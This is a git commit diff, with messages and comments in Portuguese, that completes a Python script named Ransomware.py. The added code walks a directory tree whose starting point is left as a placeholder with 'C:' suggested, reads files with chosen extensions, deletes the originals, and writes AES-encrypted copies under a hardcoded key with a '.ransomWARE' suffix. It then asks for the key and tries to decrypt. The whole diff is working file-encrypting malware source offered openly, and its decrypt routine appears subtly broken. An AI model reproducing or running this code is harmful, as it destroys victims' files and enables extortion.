5efb0da9782321153716434e99187e055d0d6caf
Vinicius Antônio Leite <josievinileite@gmail.com>
2021-11-04 17:34:08 -0300

    Projeto de Ransomware completo

--- Ransomware.py
+++ Ransomware.py
@@ -1,6 +1,5 @@
 import os
 import pyaes
-import glob
 
 arquivos_brutos = []
 pastas = []
@@ -8,18 +7,43 @@ lista_de_arquivo = []
 path_completo = []
 lista_de_extensoes = ["JPG", "png", "txt"]  #Adicionar as extensões que vão ser criptografadas
 
+key = b"fk2yla7hf6ya1fg9" #Chave de criptografia
+
 def encrypt(caminhos):
     for caminho in caminhos:
-        print(caminho)
-        ##Lendo o conteúdo do ARQUIVO
+
+        #Lendo o conteúdo do ARQUIVO
         with open(caminho, "rb") as arquivo:
             arquivo_lido = arquivo.read()
-            print(arquivo_lido)
+        os.remove(caminho)
+
         ##criptografar o arquivo
+        aes = pyaes.AESModeOfOperationCTR(key)
+        arquivo_criptografado = aes.encrypt(arquivo_lido)
+        novo_arquivo = open(caminho + ".ransomWARE", "wb")
+        novo_arquivo.write(arquivo_criptografado)
+        novo_arquivo.close()
+
+def decrypt(caminhos):
+    for caminho in caminhos:
+
+        #Lendo o arquivo criptografado
+        with open(caminho +".ransomWARE", "rb") as arquivo:
+            arquivo_lido = arquivo.read()
+        os.remove(caminho + ".ransomWARE")
+
+        #Descriptografando o arquivo
+        aes = pyaes.AESModeOfOperationCTR(key)
+        arquivo_descriptografado = aes.decrypt(arquivo_lido)
+
+        #Escrevendo o arquivo descriptografado
+        novo_arquivo = open(caminho.removesuffix(".ransomWARE"), "wb")
+        novo_arquivo.write(arquivo_descriptografado)
+        novo_arquivo.close()
 
 
 #Buscando arquivos para criptografar
-for root, dirs, files in os.walk("C:\\Users\\vinicius\\Documents\\teste_ransomware\\demo"):
+for root, dirs, files in os.walk(#COLOCAR O LOCAL INICIAL DA CRIPTOGRAFIA. EX: C: ):
 
     arquivos_brutos.append(files)
     for arquivos_diversos in arquivos_brutos:
@@ -33,3 +57,13 @@ for root, dirs, files in os.walk("C:\\Users\\vinicius\\Documents\\teste_ransomwa
                         path_completo.append(f"{root}"+ "\\" + f"{arquivo}")
 
 encrypt(path_completo)
+
+chave = input("Digite a key para DESCRIPTOGRAFAR: ")
+
+
+if key == bytes(chave, 'utf-8'):
+    print("CHAVE ACEITA!")
+    decrypt(path_completo)
+    print("DESCRIPTOGRAFADO COM SUCESSO!!!")
+else:
+    print("Chave de descriptografia INVÁLIDA! Encerrando o processo!!!!")
